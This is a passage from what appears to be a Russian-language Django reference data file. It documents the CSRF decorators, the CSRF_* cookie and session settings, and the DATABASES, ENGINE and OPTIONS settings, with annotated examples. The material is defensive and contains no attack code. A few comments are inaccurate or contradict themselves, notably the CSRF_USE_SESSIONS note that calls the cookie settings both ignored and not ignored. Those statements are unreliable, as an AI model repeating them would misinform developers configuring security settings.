# что её нужно защитить — заменить на @csrf_protect (или просто убрать @csrf_exempt,
# если middleware включён глобально):
@csrf_protect       # вместо @csrf_exempt
def previously_unsafe(request): ...

# По умолчанию (CsrfViewMiddleware в MIDDLEWARE и нет @csrf_exempt) декоратор
# csrf_protect не нужен — защита уже работает. Применение декоратора повторно
# не сломает: проверка просто не выполнится дважды.`,
  },
  {
    name: "requires_csrf_token(view)",
    category: "Cross Site Request Forgery protection",
    description:
      "Декоратор django.views.decorators.csrf.requires_csrf_token — гарантирует, что в шаблоне будет работать тег {% csrf_token %} даже если CsrfViewMiddleware решил пропустить запрос. По умолчанию контекст-процессор csrf срабатывает, только если запрос дошёл до middleware. Если view вызывается до того, как middleware успел обработать запрос (например, кастомные обработчики 404/500), {% csrf_token %} вернёт пустую строку. Декоратор форсирует доступность токена.",
    syntax: `from django.views.decorators.csrf import requires_csrf_token

@requires_csrf_token
def my_404(request, exception):
    return render(request, '404.html')`,
    arguments: [
      {
        name: "view",
        description:
          "Декорируемая view-функция. Декоратор гарантирует, что get_token(request) будет вызван, и шаблонный тег {% csrf_token %} вернёт валидный токен.",
      },
    ],
    example: `from django.shortcuts import render
from django.views.decorators.csrf import requires_csrf_token

# Кастомные обработчики ошибок — обходят middleware-цепочку
@requires_csrf_token
def custom_404(request, exception):
    # На странице 404 есть форма обратной связи, ей нужен CSRF-токен:
    return render(request, '404.html')

@requires_csrf_token
def custom_500(request):
    return render(request, '500.html')

# urls.py
# handler404 = 'myapp.views.custom_404'
# handler500 = 'myapp.views.custom_500'

# templates/404.html
# <h1>Страница не найдена</h1>
# <form method="post" action="/feedback/">
#   {% csrf_token %}    ← без @requires_csrf_token будет пустой тег
#   <textarea name="message"></textarea>
#   <button>Отправить</button>
# </form>

# Различие декораторов CSRF:
#   csrf_protect          — выполнить CSRF-проверку входящего запроса
#   csrf_exempt           — пропустить CSRF-проверку
#   requires_csrf_token   — обеспечить наличие токена для шаблона
#                           (без выполнения проверки на входящий запрос)
#   ensure_csrf_cookie    — гарантировать установку cookie csrftoken в ответе

# requires_csrf_token нужен редко — только для error handlers и view,
# которые выполняются вне middleware-цепочки.`,
  },
  {
    name: "ensure_csrf_cookie(view)",
    category: "Cross Site Request Forgery protection",
    description:
      "Декоратор django.views.decorators.csrf.ensure_csrf_cookie — гарантирует, что в ответе на этот запрос будет установлена cookie csrftoken (или сессионный ключ при CSRF_USE_SESSIONS=True). По умолчанию Django устанавливает cookie только при первом обращении к токену через {% csrf_token %} или get_token(). Декоратор полезен для страниц, которые сами не содержат форм, но фронтенд использует токен из cookie для последующих fetch/AJAX-запросов (SPA-сценарий).",
    syntax: `from django.views.decorators.csrf import ensure_csrf_cookie

@ensure_csrf_cookie
def home(request):
    return render(request, 'home.html')`,
    arguments: [
      {
        name: "view",
        description:
          "Декорируемая view-функция. Декоратор вызывает get_token(request) перед возвратом ответа, что заставляет CsrfViewMiddleware установить cookie csrftoken.",
      },
    ],
    example: `from django.shortcuts import render
from django.views.decorators.csrf import ensure_csrf_cookie
from django.utils.decorators import method_decorator
from django.views.generic import TemplateView

# SPA-сценарий: главная страница без форм, но JavaScript будет
# делать POST-запросы к API — нужен csrftoken cookie с первого визита
@ensure_csrf_cookie
def spa_index(request):
    return render(request, 'spa/index.html')

# CBV для SPA
@method_decorator(ensure_csrf_cookie, name='dispatch')
class SPAView(TemplateView):
    template_name = 'spa/index.html'

# JavaScript на странице:
# function getCookie(name) {
#   return document.cookie.split('; ')
#     .find(r => r.startsWith(name + '='))
#     ?.split('=')[1];
# }
#
# const csrftoken = getCookie('csrftoken');
# fetch('/api/posts/', {
#   method: 'POST',
#   headers: {
#     'X-CSRFToken': csrftoken,
#     'Content-Type': 'application/json',
#   },
#   body: JSON.stringify({title: 'Hi'}),
# });

# Без @ensure_csrf_cookie:
#   - Пользователь открывает / → cookie csrftoken НЕ выставляется
#   - JS пытается getCookie('csrftoken') → undefined
#   - POST уходит без X-CSRFToken → 403 Forbidden

# Совместимость с CSRF_USE_SESSIONS=True:
#   - Декоратор всё равно работает: токен сохраняется в сессии
#   - get_token(request) → берёт/создаёт токен в request.session`,
  },
  {
    name: "CSRF_COOKIE_AGE",
    category: "Cross Site Request Forgery protection",
    description:
      "Настройка времени жизни cookie csrftoken в секундах. По умолчанию 31449600 (примерно 1 год). При истечении срока cookie удаляется, и при следующем POST пользователь получит 403, пока не загрузит страницу с {% csrf_token %} ещё раз. Установка значения None делает cookie session-cookie (удаляется при закрытии браузера). При CSRF_USE_SESSIONS=True настройка игнорируется — токен живёт столько, сколько живёт сессия.",
    syntax: `# settings.py
CSRF_COOKIE_AGE = 31449600  # 1 год (по умолчанию)`,
    arguments: [],
    example: `# settings.py — варианты конфигурации

# По умолчанию — токен живёт год
CSRF_COOKIE_AGE = 60 * 60 * 24 * 365   # 31536000 ≈ 1 год

# Сократить до недели — компромисс между безопасностью и UX
CSRF_COOKIE_AGE = 60 * 60 * 24 * 7    # 604800 секунд

# Session cookie (удаляется при закрытии браузера)
CSRF_COOKIE_AGE = None
# Set-Cookie: csrftoken=...; (без атрибутов Max-Age и Expires)

# Очень короткий срок — для повышенной безопасности
CSRF_COOKIE_AGE = 3600                  # 1 час
# Минус: пользователь, открывший вкладку и оставивший её на ночь,
# получит 403 при попытке отправить форму утром.

# Зачем длинный срок:
#   Даже если cookie утекла, без знания текущего токена сессии атакующий
#   не сможет её использовать — с CSRF_USE_SESSIONS=False токен — это и есть
#   значение cookie + дополнительная защита через double-submit.

# Когда CSRF_USE_SESSIONS = True:
#   Настройка CSRF_COOKIE_AGE игнорируется, время жизни задаётся через
#   SESSION_COOKIE_AGE (по умолчанию 2 недели).`,
  },
  {
    name: "CSRF_COOKIE_DOMAIN",
    category: "Cross Site Request Forgery protection",
    description:
      'Настройка домена cookie csrftoken. По умолчанию None — cookie доступна только тому домену, который её установил (без атрибута Domain). Установка ".example.com" делает cookie доступной всем поддоменам — необходимо для архитектуры с фронтендом и API на разных поддоменах (app.example.com и api.example.com), где нужно расшаривать CSRF-токен между ними.',
    syntax: `# settings.py
CSRF_COOKIE_DOMAIN = None  # по умолчанию: только текущий домен`,
    arguments: [],
    example: `# settings.py — варианты конфигурации

# По умолчанию — cookie только для текущего домена
CSRF_COOKIE_DOMAIN = None
# Set-Cookie: csrftoken=...; Path=/
# Доступна только example.com (НЕ api.example.com)

# Шарить между поддоменами (фронтенд + API)
CSRF_COOKIE_DOMAIN = '.example.com'    # точка в начале — для всех поддоменов
# Set-Cookie: csrftoken=...; Domain=.example.com; Path=/
# Доступна example.com, www.example.com, api.example.com, app.example.com

# Сценарий multi-subdomain:
# - app.example.com — фронтенд (Django + Vue/React)
# - api.example.com — Django API
# - www.example.com — лендинг
# Все три должны видеть один и тот же csrftoken.

# Согласованные настройки для multi-subdomain:
CSRF_COOKIE_DOMAIN     = '.example.com'
SESSION_COOKIE_DOMAIN  = '.example.com'
LANGUAGE_COOKIE_DOMAIN = '.example.com'
ALLOWED_HOSTS          = ['.example.com']
CSRF_TRUSTED_ORIGINS   = ['https://*.example.com']

# ВАЖНО: cookie с Domain=.example.com доступна ВСЕМ поддоменам, включая
# user-content.example.com (если такой есть). Это потенциальный риск:
# зловредный поддомен может прочитать/подменить токен. Если используете
# поддомены для пользовательского контента — НЕ устанавливайте Domain.`,
  },
  {
    name: "CSRF_COOKIE_HTTPONLY",
    category: "Cross Site Request Forgery protection",
    description:
      "Логическая настройка, добавляющая флаг HttpOnly к cookie csrftoken. По умолчанию False — JavaScript должен иметь доступ к cookie, чтобы прочитать токен и положить его в заголовок X-CSRFToken для AJAX-запросов. Установка True блокирует доступ из JS, что несовместимо с большинством AJAX-сценариев (нужно будет получать токен через {% csrf_token %} в HTML или эндпоинт, возвращающий токен в теле). Не путать с SESSION_COOKIE_HTTPONLY (для сессионной cookie).",
    syntax: `# settings.py
CSRF_COOKIE_HTTPONLY = False  # по умолчанию`,
    arguments: [],
    example: `# settings.py — варианты конфигурации

# По умолчанию — JS читает cookie напрямую
CSRF_COOKIE_HTTPONLY = False
# Set-Cookie: csrftoken=...; Path=/
#
# JavaScript:
#   const token = document.cookie.split('csrftoken=')[1].split(';')[0];
#   fetch('/api/', {headers: {'X-CSRFToken': token}, ...});

# Усиленная безопасность — блокировать доступ из JS
CSRF_COOKIE_HTTPONLY = True
# Set-Cookie: csrftoken=...; Path=/; HttpOnly
#
# JavaScript:
#   document.cookie  ← НЕ содержит csrftoken
#   Нужен другой способ получить токен:
#     - Положить в HTML-страницу через {% csrf_token %}:
#       <meta name="csrf-token" content="{{ csrf_token }}">
#       const token = document.querySelector('meta[name=csrf-token]').content;
#     - Или эндпоинт, возвращающий токен:
#       def get_csrf(request):
#           return JsonResponse({'csrftoken': get_token(request)})

# Зачем включать HttpOnly:
#   Защищает cookie от чтения через XSS. Но XSS-атакующий всё равно может
#   просто прочитать токен из {% csrf_token %} в DOM или через get_csrf-эндпоинт,
#   поэтому реальная защита от XSS — устранять XSS, а не прятать cookie.

# Большинство проектов оставляют False — иначе ломается стандартная схема
# X-CSRFToken для AJAX. True имеет смысл только если:
#   1. Нет JS на сайте вообще (только HTML-формы с {% csrf_token %})
#   2. Архитектура использует только заголовок Authorization без cookie`,
  },
  {
    name: "CSRF_COOKIE_NAME",
    category: "Cross Site Request Forgery protection",
    description:
      'Имя cookie, в которой хранится CSRF-токен. По умолчанию "csrftoken". Меняется в особых сценариях: конфликт с другим приложением на том же домене, использующим то же имя; интеграция с фронтенд-фреймворком, ожидающим определённое имя (например, Axios по умолчанию ищет XSRF-TOKEN). При изменении нужно согласованно поменять и считыватель токена в JavaScript-коде.',
    syntax: `# settings.py
CSRF_COOKIE_NAME = 'csrftoken'  # по умолчанию`,
    arguments: [],
    example: `# settings.py — варианты конфигурации

# По умолчанию
CSRF_COOKIE_NAME = 'csrftoken'

# Совместимость с Axios — он по умолчанию читает XSRF-TOKEN
CSRF_COOKIE_NAME = 'XSRF-TOKEN'
CSRF_HEADER_NAME = 'HTTP_X_XSRF_TOKEN'   # и заголовок поменять
# Тогда Axios будет работать "из коробки":
# axios.post('/api/', data)   # сам прочитает XSRF-TOKEN cookie и поставит X-XSRF-TOKEN

# Кастомное имя для устранения конфликта на shared-хостинге
CSRF_COOKIE_NAME = 'mysite_csrf'

# Если приложение работает за reverse proxy с другим Django-сервисом,
# где cookie csrftoken уже занята — поменять имя:
CSRF_COOKIE_NAME = 'admin_csrftoken'

# JavaScript-обновление вместе с настройкой:
# Было:
#   const t = document.cookie.split('csrftoken=')[1].split(';')[0];
# Стало:
#   const t = document.cookie.split('mysite_csrf=')[1].split(';')[0];

# Шаблонный тег {% csrf_token %} автоматически использует правильное имя —
# его менять не нужно.`,
  },
  {
    name: "CSRF_COOKIE_PATH",
    category: "Cross Site Request Forgery protection",
    description:
      'Атрибут Path для cookie csrftoken — пути на сайте, для которых cookie отправляется браузером в запросах. По умолчанию "/" — cookie действует на весь сайт. Сужение пути (например, "/admin/") делает cookie доступной только в указанной поддиректории. Используется при размещении нескольких независимых Django-приложений на одном домене (admin/, public/, api/), чтобы их cookie не конфликтовали.',
    syntax: `# settings.py
CSRF_COOKIE_PATH = '/'  # по умолчанию`,
    arguments: [],
    example: `# settings.py — варианты конфигурации

# По умолчанию — cookie на весь сайт
CSRF_COOKIE_PATH = '/'
# Set-Cookie: csrftoken=...; Path=/
# Отправляется на /, /admin/, /api/v1/users/, /anything/

# Ограничить cookie путём админки
CSRF_COOKIE_PATH = '/admin/'
# Set-Cookie: csrftoken=...; Path=/admin/
# Отправляется только на /admin/* — публичные формы получат свою cookie.

# Сценарий — два независимых Django-приложения на одном домене:
# example.com/admin/  → CSRF_COOKIE_PATH = '/admin/'
#                       CSRF_COOKIE_NAME = 'admin_csrftoken'
# example.com/api/    → CSRF_COOKIE_PATH = '/api/'
#                       CSRF_COOKIE_NAME = 'api_csrftoken'
# Это позволяет каждому приложению иметь независимый CSRF-токен,
# не пересекаясь с соседним.

# Согласовать с SESSION_COOKIE_PATH для сессий:
SESSION_COOKIE_PATH = '/admin/'
CSRF_COOKIE_PATH    = '/admin/'

# В большинстве проектов настройку менять не нужно — оставлять "/".`,
  },
  {
    name: "CSRF_COOKIE_SAMESITE",
    category: "Cross Site Request Forgery protection",
    description:
      'Атрибут SameSite для cookie csrftoken. Возможные значения: "Lax" (по умолчанию) — cookie отправляется с навигационными GET-запросами с других сайтов, но не с подзапросами; "Strict" — cookie не отправляется ни с какими cross-site запросами, включая клики по ссылкам с других сайтов; "None" — cookie отправляется всегда (требует Secure). Дополнительный слой защиты от CSRF поверх токена; современные браузеры по умолчанию ставят Lax даже для старых cookie без явного атрибута.',
    syntax: `# settings.py
CSRF_COOKIE_SAMESITE = 'Lax'  # по умолчанию`,
    arguments: [],
    example: `# settings.py — варианты конфигурации

# По умолчанию (рекомендуется для большинства сайтов)
CSRF_COOKIE_SAMESITE = 'Lax'
# Set-Cookie: csrftoken=...; SameSite=Lax
# - Переходы по ссылкам с других сайтов: cookie ОТПРАВЛЯЕТСЯ
# - <iframe>, fetch с других сайтов: cookie НЕ отправляется
# - <img>, <script src> с других сайтов: cookie НЕ отправляется

# Максимальная строгость
CSRF_COOKIE_SAMESITE = 'Strict'
# - Любой запрос с другого сайта (даже клик по ссылке): cookie НЕ отправляется
# - Минус UX: пользователь, перешедший на сайт по ссылке из email или мессенджера,
#   при первом запросе будет считаться "не вошедшим в систему",
#   потому что cookie не пришла. Нужен второй переход.

# Cross-site scenario — фронтенд и API на разных доменах
CSRF_COOKIE_SAMESITE = 'None'      # обязательно с Secure
CSRF_COOKIE_SECURE   = True        # требуется браузерами при SameSite=None
# Set-Cookie: csrftoken=...; SameSite=None; Secure
# Используется, когда:
# - фронтенд: https://app.example.com
# - API:      https://api.partner.com (другой eTLD+1)
# - запросы fetch('https://api.partner.com/...', {credentials: 'include'})
#   должны нести cookie csrftoken

# Согласованные настройки для cross-site:
CSRF_COOKIE_SAMESITE    = 'None'
SESSION_COOKIE_SAMESITE = 'None'
CSRF_COOKIE_SECURE      = True
SESSION_COOKIE_SECURE   = True
CORS_ALLOW_CREDENTIALS  = True   # если используется django-cors-headers`,
  },
  {
    name: "CSRF_COOKIE_SECURE",
    category: "Cross Site Request Forgery protection",
    description:
      "Логическая настройка, добавляющая флаг Secure к cookie csrftoken. По умолчанию False. При True cookie отправляется только по HTTPS — защищает токен от перехвата в открытой сети при HTTP. Обязательно True в production-проекте на HTTPS. Если SameSite=None, флаг Secure становится обязательным (требуется браузерами).",
    syntax: `# settings.py
CSRF_COOKIE_SECURE = True  # для production на HTTPS`,
    arguments: [],
    example: `# settings.py — production-конфигурация

# Production (HTTPS)
CSRF_COOKIE_SECURE    = True
SESSION_COOKIE_SECURE = True
SECURE_SSL_REDIRECT   = True       # автоматический redirect HTTP → HTTPS
# Set-Cookie: csrftoken=...; Secure
# Cookie не уходит по HTTP, защищена от sniff-атак на публичном Wi-Fi.

# Development (HTTP localhost) — оставлять False
CSRF_COOKIE_SECURE = False
# Иначе cookie не установится при localhost-разработке.

# Условная настройка по окружению
import os
DEBUG = os.environ.get('DEBUG', 'False') == 'True'
CSRF_COOKIE_SECURE    = not DEBUG
SESSION_COOKIE_SECURE = not DEBUG

# При SameSite='None' Secure обязателен
CSRF_COOKIE_SAMESITE = 'None'
CSRF_COOKIE_SECURE   = True       # без True браузеры отвергнут cookie

# Чек-лист безопасности cookie для production:
CSRF_COOKIE_SECURE    = True
CSRF_COOKIE_HTTPONLY  = False    # обычно False — нужен JS-доступ
CSRF_COOKIE_SAMESITE  = 'Lax'    # или 'Strict' для повышенной безопасности
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Lax'`,
  },
  {
    name: "CSRF_FAILURE_VIEW",
    category: "Cross Site Request Forgery protection",
    description:
      'Путь импорта view-функции, которая вызывается при провале CSRF-проверки (отсутствует или невалидный токен, несовпадение Origin/Referer, недоверенный источник). По умолчанию "django.views.csrf.csrf_failure" — стандартная страница 403 с описанием причины. Переопределяется для кастомного UI ошибки (брендированная страница 403, перевод на свой язык, JSON-ответ для API). Сигнатура: view(request, reason="").',
    syntax: `# settings.py
CSRF_FAILURE_VIEW = 'myapp.views.custom_csrf_failure'`,
    arguments: [],
    example: `# myapp/views.py — кастомный обработчик
from django.shortcuts import render
from django.http import JsonResponse, HttpResponseForbidden

def custom_csrf_failure(request, reason=''):
    """
    Сигнатура: (request, reason: str) → HttpResponse
    reason — текстовое описание причины провала.
    """
    # Различить API-запрос и обычный
    if request.headers.get('Accept', '').startswith('application/json'):
        return JsonResponse(
            {'error': 'csrf_failure', 'reason': reason},
            status=403,
        )

    # HTML-страница с подробностями
    return render(
        request,
        '403_csrf.html',
        {'reason': reason},
        status=403,
    )

# settings.py
CSRF_FAILURE_VIEW = 'myapp.views.custom_csrf_failure'

# Возможные значения reason:
#   'CSRF cookie not set.'
#   'CSRF token missing.'
#   'CSRF token from POST incorrect.'
#   'CSRF token from POST has incorrect length.'
#   'CSRF token from the "X-CSRFToken" HTTP header has incorrect format.'
#   'Origin checking failed - https://evil.com does not match any trusted origins.'
#   'Referer checking failed - no Referer.'

# templates/403_csrf.html
# <!DOCTYPE html>
# <html>
#   <body>
#     <h1>Доступ запрещён</h1>
#     <p>Не удалось проверить CSRF-токен.</p>
#     <p>Возможно, ваша сессия устарела. <a href="/">Обновите страницу</a>.</p>
#     {% if debug %}<details><summary>Детали</summary><pre>{{ reason }}</pre></details>{% endif %}
#   </body>
# </html>`,
  },
  {
    name: "CSRF_HEADER_NAME",
    category: "Cross Site Request Forgery protection",
    description:
      'Имя HTTP-заголовка, в котором CsrfViewMiddleware ищет CSRF-токен (помимо POST-поля). По умолчанию "HTTP_X_CSRFTOKEN" (это значение в request.META — соответствует HTTP-заголовку X-CSRFToken). Меняется при интеграции с фронтенд-библиотеками, использующими другие имена (Axios — X-XSRF-TOKEN). Имя должно начинаться с "HTTP_" и быть в верхнем регистре с подчёркиваниями вместо дефисов — это формат Django META-словаря.',
    syntax: `# settings.py
CSRF_HEADER_NAME = 'HTTP_X_CSRFTOKEN'  # по умолчанию (HTTP-заголовок X-CSRFToken)`,
    arguments: [],
    example: `# settings.py — варианты конфигурации

# По умолчанию
CSRF_HEADER_NAME = 'HTTP_X_CSRFTOKEN'
# Соответствует HTTP-заголовку: X-CSRFToken: <token>
#
# JavaScript:
#   fetch('/api/', {
#     method: 'POST',
#     headers: {'X-CSRFToken': token},
#     ...
#   });

# Совместимость с Axios — он шлёт X-XSRF-TOKEN
CSRF_HEADER_NAME = 'HTTP_X_XSRF_TOKEN'
CSRF_COOKIE_NAME = 'XSRF-TOKEN'
# Тогда Axios "из коробки":
# axios.defaults.xsrfCookieName = 'XSRF-TOKEN';
# axios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN';
# axios.post('/api/', data);   // автоматически найдёт cookie и поставит заголовок

# Кастомное имя
CSRF_HEADER_NAME = 'HTTP_X_MYAPP_CSRF'
# HTTP-заголовок: X-Myapp-Csrf: <token>

# Преобразование имени:
#   HTTP-заголовок:    X-CSRFToken
#   request.META key:  HTTP_X_CSRFTOKEN  (HTTP_ префикс + UPPER + _ вместо -)
#   В CSRF_HEADER_NAME: 'HTTP_X_CSRFTOKEN'

# Это формат WSGI/Django, не путать с настройками nginx или DRF.`,
  },
  {
    name: "CSRF_TRUSTED_ORIGINS",
    category: "Cross Site Request Forgery protection",
    description:
      'Список Origin (схема + хост [+ порт]), которым разрешено отправлять небезопасные запросы (POST/PUT/DELETE). С Django 4.0 формат — полные URL со схемой ("https://example.com"), не просто домены. Поддерживается wildcard в поддоменах: "https://*.example.com". Используется когда форма отправляется с поддомена/другого домена (фронтенд на app.example.com, API на api.example.com), а также при работе за reverse proxy с заголовком Forwarded. Без записи в этот список запросы получают 403 даже с валидным токеном.',
    syntax: `# settings.py
CSRF_TRUSTED_ORIGINS = ['https://example.com', 'https://*.example.com']`,
    arguments: [],
    example: `# settings.py — варианты конфигурации

# Основной домен и поддомены
CSRF_TRUSTED_ORIGINS = [
    'https://example.com',
    'https://www.example.com',
    'https://*.example.com',         # wildcard для всех поддоменов
]

# Reverse proxy с другим именем
CSRF_TRUSTED_ORIGINS = [
    'https://example.com',
    'https://internal.example.com',  # внутренний хост за прокси
]

# Разработка с локальным IP вместо localhost
CSRF_TRUSTED_ORIGINS = [
    'http://localhost:8000',
    'http://127.0.0.1:8000',
    'http://192.168.1.100:8000',     # IP в локальной сети для тестов с телефона
]

# Когда нужен:
# 1. Кросс-доменные формы:
#    Форма на https://app.example.com → POST на https://api.example.com
#    api.example.com нужен в CSRF_TRUSTED_ORIGINS = ['https://app.example.com']
#
# 2. Reverse proxy (nginx → gunicorn):
#    Браузер → https://example.com (nginx) → http://gunicorn:8000 (Django)
#    Django видит Origin: https://example.com и должен ему доверять
#
# 3. Production-домен после миграции с DEBUG=True:
#    На разработке всё работает, но после деплоя на новый домен — 403.
#    Решение: добавить новый домен в CSRF_TRUSTED_ORIGINS.

# Wildcard синтаксис:
#   'https://*.example.com'    — любой поддомен (a.example.com, b.example.com)
#   'https://example.com'      — только корневой
#   'https://*'                — НЕ работает, должен быть TLD

# Изменение в Django 4.0:
# Было: CSRF_TRUSTED_ORIGINS = ['example.com']                      (только хост)
# Стало: CSRF_TRUSTED_ORIGINS = ['https://example.com']             (полный URL)`,
  },
  {
    name: "CSRF_USE_SESSIONS",
    category: "Cross Site Request Forgery protection",
    description:
      "Логическая настройка — где хранить CSRF-токен. По умолчанию False — токен в cookie csrftoken. При True — токен сохраняется в request.session, cookie не используется (требует SessionMiddleware). Преимущества True: токен невидим для JavaScript (даже без HttpOnly), не передаётся между поддоменами автоматически, время жизни связано с сессией. Недостатки: требует session backend для каждого CSRF-запроса (обращение к БД/cache); JS должен получать токен другим способом (через {% csrf_token %} в HTML или через специальный эндпоинт).",
    syntax: `# settings.py
CSRF_USE_SESSIONS = False  # по умолчанию (токен в cookie)
# или True (токен в сессии)`,
    arguments: [],
    example: `# settings.py — варианты конфигурации

# По умолчанию — токен в cookie csrftoken
CSRF_USE_SESSIONS = False
# - cookie csrftoken устанавливается автоматически
# - JavaScript: const t = document.cookie.split('csrftoken=')[1]...
# - Игнорируются: CSRF_COOKIE_AGE, _NAME, _DOMAIN, _PATH, _HTTPONLY,
#   _SAMESITE, _SECURE — НЕ игнорируются, они применяются к cookie csrftoken.

# Альтернатива — токен в сессии
CSRF_USE_SESSIONS = True
# Требуется SessionMiddleware:
MIDDLEWARE = [
    ..., 'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
]
# - Cookie csrftoken НЕ устанавливается
# - Токен хранится в request.session под ключом '_csrftoken'
# - Все настройки CSRF_COOKIE_* игнорируются (нет cookie)
# - Время жизни = SESSION_COOKIE_AGE
# - JS должен получать токен через HTML или эндпоинт:

# Получение токена в шаблоне (для JS):
# <meta name="csrf-token" content="{{ csrf_token }}">
# const token = document.querySelector('meta[name=csrf-token]').content;

# Или через специальный эндпоинт:
from django.middleware.csrf import get_token
from django.http import JsonResponse
from django.views.decorators.http import require_GET

@require_GET
def csrf_token_view(request):
    return JsonResponse({'csrftoken': get_token(request)})
# urls.py: path('api/csrf/', csrf_token_view)
# JavaScript:
#   const r = await fetch('/api/csrf/');
#   const {csrftoken} = await r.json();
#   await fetch('/api/post/', {
#       method: 'POST',
#       headers: {'X-CSRFToken': csrftoken},
#       ...,
#   });

# Когда True имеет смысл:
# - Высокие требования к безопасности (банковский/медицинский домен)
# - Анонимные пользователи всё равно получают сессию (есть SessionMiddleware)
# - Архитектура без отдельных поддоменов (cookie не нужно расшаривать)

# Когда False (по умолчанию) лучше:
# - Стандартный SPA с fetch/AJAX (проще читать cookie)
# - Высокая нагрузка (cookie не требует обращения к session backend)
# - Анонимные сценарии без сессий`,
  },
  {
    name: "DATABASES",
    category: "Databases",
    description:
      'Главная настройка Django для подключения к базам данных. Словарь словарей: ключ верхнего уровня — алиас БД (обязательно "default"), значение — конфигурация подключения с ключами ENGINE, NAME, USER, PASSWORD, HOST, PORT, OPTIONS, CONN_MAX_AGE, CONN_HEALTH_CHECKS, ATOMIC_REQUESTS, AUTOCOMMIT, TIME_ZONE, TEST. Поддерживает несколько БД одновременно — они выбираются через .using("alias") в QuerySet или через DATABASE_ROUTERS.',
    syntax: `# settings.py
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME':   'mydb',
        'USER':   'myuser',
        ...
    },
}`,
    arguments: [],
    example: `# settings.py — одна БД (PostgreSQL)
DATABASES = {
    'default': {
        'ENGINE':   'django.db.backends.postgresql',
        'NAME':     'mydb',
        'USER':     'myuser',
        'PASSWORD': os.environ['DB_PASSWORD'],
        'HOST':     'db.example.com',
        'PORT':     '5432',
        'CONN_MAX_AGE': 60,
        'OPTIONS': {'sslmode': 'require'},
    },
}

# SQLite — самый простой вариант (по умолчанию для startproject)
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME':   BASE_DIR / 'db.sqlite3',
    },
}

# Несколько БД с роутингом
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME':   'main',
    },
    'analytics': {                           # отдельная БД для аналитики
        'ENGINE': 'django.db.backends.postgresql',
        'NAME':   'analytics',
        'HOST':   'analytics-db.example.com',
    },
    'replica': {                             # read-replica
        'ENGINE': 'django.db.backends.postgresql',
        'NAME':   'main',
        'HOST':   'replica.example.com',
    },
}
DATABASE_ROUTERS = ['myapp.routers.AnalyticsRouter']

# Использование в коде:
Event.objects.using('analytics').filter(...)         # явный выбор БД
User.objects.using('replica').get(pk=1)              # читать с реплики
with transaction.atomic(using='analytics'):
    Event.objects.create(...)

# Настройка из URL (django-environ)
import environ
env = environ.Env()
DATABASES = {'default': env.db()}                     # DATABASE_URL=postgres://user:pass@host/db

# Доступные ENGINE из коробки:
#   django.db.backends.postgresql
#   django.db.backends.mysql
#   django.db.backends.sqlite3
#   django.db.backends.oracle`,
  },
  {
    name: "ENGINE",
    category: "Databases",
    description:
      'Ключ внутри DATABASES[alias], указывающий путь импорта Python-модуля бэкенда базы данных. Встроенные бэкенды Django: "django.db.backends.postgresql", "django.db.backends.mysql", "django.db.backends.sqlite3", "django.db.backends.oracle". Можно указать сторонний бэкенд: django-mssql-backend, django-cockroachdb, django.contrib.gis.db.backends.postgis (для GeoDjango). От выбора зависят доступные типы полей, синтаксис миграций и поддерживаемые OPTIONS.',
    syntax: `# settings.py
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        ...
    },
}`,
    arguments: [],
    example: `# Встроенные бэкенды Django

# PostgreSQL — рекомендуется для production
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'NAME':   'mydb',
    # требует драйвер: pip install psycopg[binary] (или psycopg2-binary)
}}

# MySQL / MariaDB
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.mysql',
    'NAME':   'mydb',
    # требует драйвер: pip install mysqlclient
}}

# SQLite — для разработки и небольших проектов
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.sqlite3',
    'NAME':   BASE_DIR / 'db.sqlite3',
    # драйвер встроен в Python (модуль sqlite3)
}}

# Oracle
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.oracle',
    # требует драйвер: pip install oracledb
}}

# GeoDjango — пространственные расширения
DATABASES = {'default': {
    'ENGINE': 'django.contrib.gis.db.backends.postgis',  # PostgreSQL + PostGIS
    # альтернативы: spatialite, mysql, oracle
}}

# Сторонние бэкенды
DATABASES = {'default': {
    'ENGINE': 'django_cockroachdb',                      # CockroachDB
    # 'ENGINE': 'mssql',                                 # MS SQL (django-mssql-backend)
    # 'ENGINE': 'django_prometheus.db.backends.postgresql',  # с метриками
}}

# От выбора ENGINE зависит:
#   - поддержка JSONField, ArrayField, HStoreField (PostgreSQL only для нативных)
#   - оконные функции (PostgreSQL/MySQL 8+/SQLite 3.25+)
#   - тип TextField vs CLOB (Oracle)
#   - кейс-чувствительность сравнений (MySQL по умолчанию case-insensitive)`,
  },
  {
    name: "OPTIONS",
    category: "Databases",
    description:
      'Словарь параметров, которые Django передаёт напрямую драйверу базы данных при подключении. Содержимое полностью зависит от выбранного ENGINE. Для PostgreSQL: sslmode, sslrootcert, connect_timeout, application_name, options ("-c statement_timeout=5000"). Для MySQL: charset, init_command, ssl, isolation_level, read_default_file. Для SQLite: timeout, isolation_level, init_command. Используется для тонкой настройки соединения, SSL, кодировок, таймаутов.',
    syntax: `# settings.py
DATABASES = {
    'default': {
        ...,
        'OPTIONS': {'sslmode': 'require', 'connect_timeout': 10},
    },
}`,
    arguments: [],
    example: `# PostgreSQL — типичные опции
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'NAME':   'mydb',
    'OPTIONS': {
        'sslmode':         'require',                # обязательный SSL
        'sslrootcert':     '/etc/ssl/rds-ca.pem',    # путь к корневому сертификату
        'connect_timeout': 10,                       # секунды на установку соединения
        'application_name': 'myapp-web',             # видно в pg_stat_activity
        'options':          '-c statement_timeout=5000 -c lock_timeout=2000',
        # statement_timeout=5000ms — отменять долгие запросы
        # lock_timeout=2000ms      — не ждать блокировок дольше 2 сек
    },
}}

# MySQL — типичные опции
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.mysql',
    'NAME':   'mydb',
    'OPTIONS': {
        'charset': 'utf8mb4',                        # полная поддержка эмодзи
        'init_command': "SET sql_mode='STRICT_TRANS_TABLES'",
        'isolation_level': 'read committed',
        'ssl': {'ca': '/etc/ssl/mysql-ca.pem'},
        'read_default_file': '/etc/mysql/my.cnf',    # читать настройки из файла
